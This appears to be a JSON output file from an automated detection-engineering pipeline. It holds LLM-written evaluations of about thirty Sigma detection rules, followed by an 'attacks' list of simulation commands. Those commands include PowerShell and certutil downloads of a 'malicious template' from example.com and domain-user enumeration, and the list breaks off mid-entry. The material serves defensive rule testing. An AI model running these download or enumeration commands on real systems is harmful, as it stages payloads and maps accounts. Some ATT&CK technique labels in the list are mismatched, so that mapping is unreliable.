          "The rule does not provide any IPs or domains, but it does contain a hardcoded file path that may not be relevant in all environments"
        ],
        "suggestions": [
          "Improve the detection logic to reduce false positives",
          "Use more generic and flexible detection methods to account for varying environments",
          "Test and verify the rule in different environments to improve detection coverage",
          "Consider adding more conditions to the rule to filter out legitimate activity",
          "Use threat intelligence feeds to stay up-to-date with the latest TTPs and improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Hollowing via cmd.exe",
        "rule_id": "580f86be-bffb-453b-9b7d-a6643af2ad54",
        "quality_score": 0.44000000000000006,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific technique (Process Hollowing) and includes relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate system administration tasks or software installations",
          "The condition 'selection_cmd and selection_createprocess' may not be sufficient to detect all cases of Process Hollowing",
          "The rule does not contain any IPs or domains, but the TTP information is incomplete"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Refine the condition to reduce false positives and improve detection coverage",
          "Consider adding more specific indicators or conditions to detect Process Hollowing",
          "Update the TTP information to include more context and details about the technique"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.8
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Files or Information Detection",
        "rule_id": "659a7e12-03ca-4193-a4b1-5d83c50bd7b2",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific Defense Evasion tactic",
          "It covers multiple potential obfuscation methods",
          "The rule includes a list of potential false positives"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "The rule may produce false positives due to legitimate use of the targeted commands",
          "The TTP information is incomplete"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Refine the rule to reduce false positives",
          "Complete the TTP information to better understand the target technique"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over Alternative Protocol",
        "rule_id": "2d788940-4f44-4698-8c59-e44cc7dcdfbf",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It targets a specific TTP"
        ],
        "weaknesses": [
          "The rule contains a hardcoded IP and domain not present in the TTP info, which could lead to hallucinations",
          "No verification run was performed to validate the rule's effectiveness",
          "The condition is too broad and may lead to false positives"
        ],
        "suggestions": [
          "Perform a verification run to validate the rule's effectiveness",
          "Remove hardcoded IPs and domains, and instead use more generic conditions that match the TTP",
          "Add more specific conditions to reduce false positives",
          "Consider adding more logging sources to increase detection coverage"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Spearphishing Attachment via Office Document",
        "rule_id": "6449b3d3-796c-4762-8711-e01487acf989",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and targets a specific TTP",
          "It uses a clear and efficient query"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate Office document editing or software installation/update activities",
          "The rule contains no IPs/Domains, which is consistent with the TTP info, but it does not provide any additional context or filtering"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Add additional filtering or context to reduce false positives, such as user or group filtering",
          "Consider adding more specific conditions to the rule to improve its detection coverage and reduce false positives"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "File and Directory Discovery via API Calls",
        "rule_id": "de8c2dff-0c1c-42e8-ade9-e2967f1c2775",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (File and Directory Discovery) with relevant API calls",
          "It includes a clear description and relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate system administration tasks or software installation processes",
          "The rule does not contain any IP or domain information, but it also does not provide any additional context or filtering to reduce potential false positives"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Add additional filtering or context to reduce potential false positives",
          "Consider including more specific conditions or exclusions to improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "System Information Discovery via Directory Listing",
        "rule_id": "7bb6cebe-efb6-436e-938e-83c70c4245da",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It covers two common system information discovery commands (dir/ls and Get-ChildItem/ls)"
        ],
        "weaknesses": [
          "The rule does not contain any specific IOCs (IPs/Domains) from the TTP information, but this is not a weakness in this case since the TTP info does not provide any",
          "The rule has a medium level of false positives due to legitimate system administration tasks and scripted directory listings",
          "No real-world verification was performed to validate the rule's effectiveness"
        ],
        "suggestions": [
          "Perform real-world verification to validate the rule's effectiveness and adjust the detection logic as needed",
          "Consider adding more specific conditions to reduce false positives (e.g., excluding specific directories or processes)",
          "Add more techniques to the rule to increase detection coverage (e.g., other system information discovery commands)"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of VBA Macro Code",
        "rule_id": "bc4fc587-d3b5-4009-8195-1d64ea485b80",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Execution of VBA Macro Code) and uses relevant log sources (Sysmon) and conditions to detect it",
          "The rule includes a clear description and relevant tags (attack.t1204, attack.execution)"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule may generate false positives due to legitimate Office macro execution or administrative tasks using Office applications",
          "The rule contains no IPs/Domains, but it does not include any information about the TTP's tactic, which could be a useful addition"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives, such as filtering out known legitimate macro execution or administrative tasks",
          "Add more information about the TTP's tactic to provide context and improve the rule's completeness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "System Information Discovery via API Calls",
        "rule_id": "7ffee057-da87-4130-9978-72eefac95747",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (System Information Discovery) and uses relevant API calls for detection",
          "The rule includes a list of potential false positives, which can help with tuning and refinement"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The rule contains no specific IPs or domains, but it does rely on generic API calls that could potentially generate false positives",
          "The condition statement is simple and may not account for complex or evasive attacker behavior"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness and identify potential areas for improvement",
          "Consider adding more specific conditions or filtering to reduce false positives and improve detection accuracy",
          "Review and refine the rule to ensure it is aligned with the target TTP and tactic"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Files or Information",
        "rule_id": "7a4e6d28-d883-4650-be56-001e894ddf2c",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Obfuscated Files or Information) and includes relevant process creation events",
          "It covers various obfuscation methods, including encoding and decoding tools"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "It may generate false positives due to legitimate use of encoding/decoding tools or compression software",
          "The rule does not contain any IPs or domains, but it relies on generic process names and command-line arguments, which could lead to false positives or false negatives"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Consider adding more specific conditions or filtering out known false positives",
          "Regularly review and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over Alternative Protocol",
        "rule_id": "536d53c8-2cee-485d-ab9a-e534e7bd5852",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple alternative protocols for exfiltration",
          "It includes various command line tools and their respective parameters",
          "The rule has a clear and descriptive title and description"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may produce false positives due to legitimate use of command line tools",
          "The rule contains no IPs or domains, but this could be a strength as it reduces the risk of hallucinations"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Add more specific conditions to reduce false positives",
          "Consider adding more alternative protocols and tools to increase detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Data Staging via System Calls",
        "rule_id": "2ea3e985-54ef-4321-9f0a-aa979d391d10",
        "quality_score": 0.65,
        "status": "fail",
        "strengths": [
          "The rule is well-structured and follows the Sigma format",
          "It targets a specific technique (Data Staging) and includes relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate system calls by system services or network configuration tools",
          "The rule contains no IPs or domains, but the TTP information is incomplete"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Consider adding more specific conditions to reduce false positives",
          "Update the TTP information to include more details about the technique and its characteristics"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.8,
          "efficiency": 0.7,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Masquerading via Legitimate Process",
        "rule_id": "a7cfe310-67be-4dc3-9220-6427e4e8de3d",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Masquerading) and uses relevant log sources (Sysmon) and fields (Image, ParentImage, CommandLine) to detect it",
          "The rule includes a clear description, title, and relevant tags for easy identification and filtering"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "The rule may generate false positives due to legitimate use of cmd.exe by administrators or scripted tasks",
          "The rule contains no IPs or domains, but it lacks specific TTP information (tactic, id) to accurately assess its coverage"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Refine the rule to reduce false positives, such as by excluding specific legitimate cmd.exe usage patterns",
          "Add more specific TTP information (tactic, id) to improve the rule's accuracy and relevance",
          "Consider adding more conditions or filters to improve the rule's performance and efficiency"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Scheduled Task Creation via Windows Task Scheduler",
        "rule_id": "1029a380-b0b8-4d2f-aa00-929d476f25cc",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers two common methods of scheduled task creation: via Windows Task Scheduler and PowerShell",
          "It includes relevant tags for attack persistence and scheduled task creation"
        ],
        "weaknesses": [
          "The rule does not account for other potential methods of scheduled task creation",
          "It contains no specific IPs or domains, but lacks information about the target TTP's tactic",
          "No real-world verification was performed, which limits the assessment of the rule's effectiveness"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate",
          "Consider adding more conditions to account for other methods of scheduled task creation",
          "Include more specific information about the target TTP's tactic to improve the rule's completeness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Control via Hard-Coded C2 Server",
        "rule_id": "12f1ff28-59b2-47fa-b715-01207ed3f9f0",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule has a clear title and description",
          "It targets a specific technique (Command and Control)"
        ],
        "weaknesses": [
          "The rule contains a hard-coded IP address (.217) not present in the TTP info, which could lead to hallucinations",
          "No real-world verification was performed, making it difficult to assess the rule's effectiveness",
          "The rule does not account for potential false positives, such as legitimate connections to servers with similar IP addresses"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness",
          "Consider using more specific and relevant IOCs (Indicators of Compromise) instead of hard-coded IP addresses",
          "Add more conditions to the rule to reduce false positives",
          "Include more information about the TTP (Tactic, Technique, and Procedure) to improve the rule's completeness and accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.6,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Resource Development Activity via Suspicious Process Creation",
        "rule_id": "1a1b803f-1d3d-40b5-a17c-df120be80cf3",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple system utilities and command-line tools that can be used for resource development activity",
          "It includes a variety of techniques and tactics, such as downloading, executing, or registering payloads",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which makes it difficult to assess its effectiveness",
          "The rule may generate false positives due to legitimate use of system utilities and command-line tools",
          "The rule contains no IPs or domains, which is a strength, but it also means that it may not be able to detect specific targeted attacks"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness and identify potential false positives",
          "Consider adding more specific conditions to reduce false positives, such as filtering out known legitimate processes or commands",
          "Continuously monitor and update the rule to ensure it stays effective against evolving threats and tactics"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Reverse Shell Creation via Command Line",
        "rule_id": "3b9ca2ea-ffd6-4211-a9ac-01f12c0d6fcc",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple techniques for creating reverse shells",
          "It includes a variety of command-line patterns and tools",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may produce false positives due to legitimate system administration activities",
          "The rule contains no IPs or domains, but its effectiveness is uncertain without verification"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Refine the rule to reduce false positives from legitimate activities",
          "Consider adding more specific conditions or filtering to improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Data Encoding for Exfiltration via Command-Line Tools",
        "rule_id": "61aff9e2-bc89-4104-8d7f-55be61258746",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command-line utilities and encoding techniques",
          "It includes a clear description and relevant tags"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment",
          "It may produce false positives due to legitimate administrative use of certutil, PowerShell, and base64 encoding"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Refine the rule to reduce false positives, such as excluding legitimate administrative use",
          "Consider adding more specific conditions to improve detection accuracy"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Discovery via Command Line Tools",
        "rule_id": "ed88ae9f-ab61-4f41-81ea-d90649f8081a",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple command line tools for process discovery",
          "It includes various techniques used by adversaries for situational awareness",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may generate false positives due to legitimate administrative activity",
          "The rule contains no IPs or domains, but its effectiveness depends on the quality of the log source"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage",
          "Tune the rule to reduce false positives by adding more specific conditions",
          "Consider adding more techniques or tools used for process discovery to improve the rule's completeness"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Process Injection Activity via Suspicious Process Creation and Command Line Patterns",
        "rule_id": "e6532b59-0483-4551-8d72-b2a808e1165a",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Process Injection) and includes relevant command line patterns and parent-child process relationships",
          "It provides a clear description and includes relevant tags and a technique name"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which limits its reliability",
          "It may generate false positives due to legitimate administrative scripts or software deployment tools",
          "The condition is quite broad, which may lead to a high false positive rate",
          "The rule contains no IPs or domains, but the lack of verification and broad condition may still lead to hallucinations"
        ],
        "suggestions": [
          "Perform real-world verification to validate the rule's effectiveness",
          "Refine the condition to reduce the false positive rate",
          "Consider adding more specific indicators or filtering out known benign processes",
          "Regularly review and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Layer Protocol Activity via Command Line Tools",
        "rule_id": "c5c16565-c303-4c95-ae00-c232294c1ae9",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Application Layer Protocol) and includes various command-line tools and patterns associated with data exfiltration or C2 communication",
          "It covers multiple potential vectors for attack, including cmd.exe, powershell.exe, certutil.exe, bitsadmin.exe, curl.exe, and wget.exe",
          "The rule includes a clear description, log source, and detection logic"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
          "The false positives section lists several potential legitimate uses of the command-line tools, which could lead to a high false positive rate",
          "The rule does not contain any specific IPs or domains, but it does rely on general patterns and command-line tools that could be used for legitimate purposes",
          "The rule's performance could be impacted by the number of process creation events in the SIEM"
        ],
        "suggestions": [
          "Verify the rule in a real-world environment to determine its effectiveness and false positive rate",
          "Consider adding more specific conditions or filters to reduce the false positive rate",
          "Optimize the rule's performance by limiting the scope of the process creation events or using more efficient query logic",
          "Continuously monitor and update the rule to ensure it remains effective against evolving threats and techniques"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter via cmd.exe",
        "rule_id": "784b16d8-4a76-41c8-8f64-470e4781a270",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "Focuses on common command-line patterns associated with malicious activity",
          "Clearly defined log source and detection criteria"
        ],
        "weaknesses": [
          "Lack of real-world verification",
          "Potential for high false positive rate due to legitimate administrative scripts or batch files executing via cmd.exe",
          "No specific IPs/Domains mentioned, but the rule may still generate false positives due to its broad detection criteria"
        ],
        "suggestions": [
          "Perform real-world verification to validate the rule's effectiveness",
          "Refine the detection criteria to reduce false positives",
          "Consider adding additional conditions to filter out legitimate administrative activity",
          "Continuously monitor and update the rule to ensure it remains effective against evolving threats"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "rule_id": "97265f44-12ad-4d5d-995f-488db57de516",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple interpreter types including PowerShell, cmd, and scripting tools",
          "It includes specific command-line indicators for each interpreter type",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not have a verification run performed, making it difficult to assess its effectiveness",
          "The rule may generate false positives due to legitimate administrative scripting or software deployment activities",
          "The rule contains no IPs or domains, but the lack of verification makes it hard to assess its accuracy"
        ],
        "suggestions": [
          "Perform a verification run to assess the rule's effectiveness in a real-world environment",
          "Add more specific conditions to reduce false positives, such as excluding certain processes or command-line arguments",
          "Consider adding more interpreter types or command-line indicators to increase the rule's detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detected Obfuscated Files or Information via Command-Line Obfuscation",
        "rule_id": "a14fd223-3402-45db-9191-99d672405de1",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers various obfuscation techniques",
          "It includes a list of potential false positives",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification",
          "It may generate false positives due to legitimate administrative scripts or software installers",
          "The rule contains no IPs or domains, but it could be improved with more specific TTP information"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's effectiveness",
          "Refine the rule to reduce false positives, such as excluding specific legitimate scripts or tools",
          "Consider adding more specific TTP information to improve the rule's accuracy and detection coverage"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over C2 Channel via Common Tools and Techniques",
        "rule_id": "3c61cd6d-1154-4718-accc-89e3195a1288",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple common tools and techniques used for data exfiltration",
          "It includes a clear description and detection logic",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule did not undergo real-world verification, which raises concerns about its effectiveness",
          "It may generate false positives due to legitimate administrative use of the detected tools and techniques",
          "The rule contains no IPs or domains, but its broad detection logic may still lead to false positives"
        ],
        "suggestions": [
          "Perform real-world verification to test the rule's effectiveness and identify potential false positives",
          "Refine the detection logic to reduce false positives, such as excluding specific command-line arguments or adding additional conditions",
          "Consider adding more specific TTP information, such as tactics or techniques, to improve the rule's accuracy and relevance"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via Common Archiving Tools and Techniques",
        "rule_id": "2f95eda2-56e8-4bfe-9ad8-59c4e8427e17",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule covers multiple archiving tools and techniques",
          "It includes a clear description and relevant tags",
          "The rule is well-structured and easy to understand"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario",
          "It may generate false positives due to legitimate administrative use of archiving tools",
          "The rule does not contain any specific IPs or domains, but this could be a weakness if the TTP info included them and they were not incorporated"
        ],
        "suggestions": [
          "Verify the rule in a real-world scenario to assess its detection coverage and false positive rate",
          "Consider adding more specific conditions to reduce false positives",
          "Include more detailed information about the TTP, such as specific IPs or domains, if available"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "User Execution of Malicious File via Suspicious Process Creation",
        "rule_id": "ef8c18c5-c12f-48fe-bf5c-ce78964627d0",
        "quality_score": 0.22000000000000003,
        "status": "fail",
        "strengths": [
          "The rule has a clear and descriptive title and description",
          "It includes relevant tags and references to attack techniques"
        ],
        "weaknesses": [
          "The rule failed to detect the attack in the real SIEM",
          "The detection logic is overly simplistic and relies on a generic 'contains' condition",
          "The rule contains no specific IPs or domains, but the condition is too broad and may lead to false positives",
          "No real-world verification was performed to validate the rule's effectiveness"
        ],
        "suggestions": [
          "Improve the detection logic to be more specific and targeted",
          "Add more specific conditions or filters to reduce false positives",
          "Perform real-world verification to validate the rule's effectiveness",
          "Consider adding more context or metadata to the rule to improve its completeness and accuracy"
        ],
        "metrics": {
          "accuracy": 0.0,
          "completeness": 0.8,
          "efficiency": 0.1,
          "maintainability": 0.2
        },
        "evaluation_method": "langchain"
      }
    ],
    "feedback": {
      "timestamp": "2025-12-22T17:09:39.834515",
      "source_agent": "fe8c9f50-8036-460a-9732-a93538c5b1f3",
      "target_agent": "rulegen",
      "average_quality_score": 0.53,
      "total_rules_evaluated": 30,
      "improvements_needed": [
        {
          "metric": "quality",
          "current_value": 0.5296666666666668,
          "target_value": 0.85,
          "suggestion": "Improve overall rule quality"
        }
      ],
      "common_issues": [
        "The rule has not been verified in a real-world environment",
        "The rule did not undergo real-world verification",
        "The rule has not been verified in a real-world environment, which raises concerns about its effectiveness",
        "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
        "No real-world verification was performed to validate the rule's effectiveness"
      ],
      "actionable_suggestions": [
        "Perform real-world verification to assess the rule's effectiveness",
        "Verify the rule in a real-world scenario to assess its detection coverage and false positive rate",
        "Verify the rule in a real-world environment to assess its detection coverage and false positive rate",
        "Perform real-world verification to assess the rule's detection coverage and false positive rate",
        "Perform real-world verification to validate the rule's effectiveness"
      ]
    }
  },
  "attacks": [
    {
      "id": "51bde7f9-2e52-460d-a46c-48aadd0e4f6a",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Remote Template Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-WebRequest -Uri 'http://example.com/malicious_template.docx' -OutFile '%TEMP%\\template.docx'\"",
      "description": "Downloads a malicious Office template to the temp directory",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.363593",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b54d682d-ccb1-47eb-a84a-d821efa6fe32",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Remote Template Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malicious_template.docx %TEMP%\\template.docx",
      "description": "Downloads a malicious Office template using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.363593",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cd3e771d-739d-4408-89da-daf197bb35a5",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Remote Template Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$bytes = [System.IO.File]::ReadAllBytes('%TEMP%\\template.docx'); $encoded = [System.Convert]::ToBase64String($bytes); Invoke-Expression -Command \"Write-Host '$encoded'\"\"",
      "description": "Reads the downloaded template and prints its Base64 encoded contents",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints the Base64 encoded contents of the file to the console",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.363593",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "411bb8e2-65fb-49af-9de5-6efa3879af15",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c net user /domain",
      "description": "Detects command line tools like net for execution",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists domain users",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.927503",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "3db52303-fa2b-409c-b39a-c66bdc85fed1",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Get-Process | Where-Object {$_.ProcessName -like 'svchost*'}\"",
      "description": "Detects command line tools like PowerShell for execution",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Lists processes matching 'svchost*'",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.927503",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "83945259-2133-4397-ba5d-abd3b4cfe548",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Command and Scripting Interpreter",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/test.txt %TEMP%\\test.txt && type %TEMP%\\test.txt",
      "description": "Detects command line tools like certutil for execution and exfiltration",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from a URL and displays its contents",
      "source": "langchain",
      "generated_at": "2025-12-22T16:42:28.927503",
      "agent_id": "01f0a480-fc7b-47d4-b7e4-d30a0f866b75",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "04ff133e-9680-4b7f-965f-8d183d5f9047",
      "ttp_id": "unknown",
      "technique_id": "T1566.001",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Invoke-Item 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE'\"",
      "description": "Spawns a command shell from Office process",
      "requires_admin": false,
      "safety_level": "low",
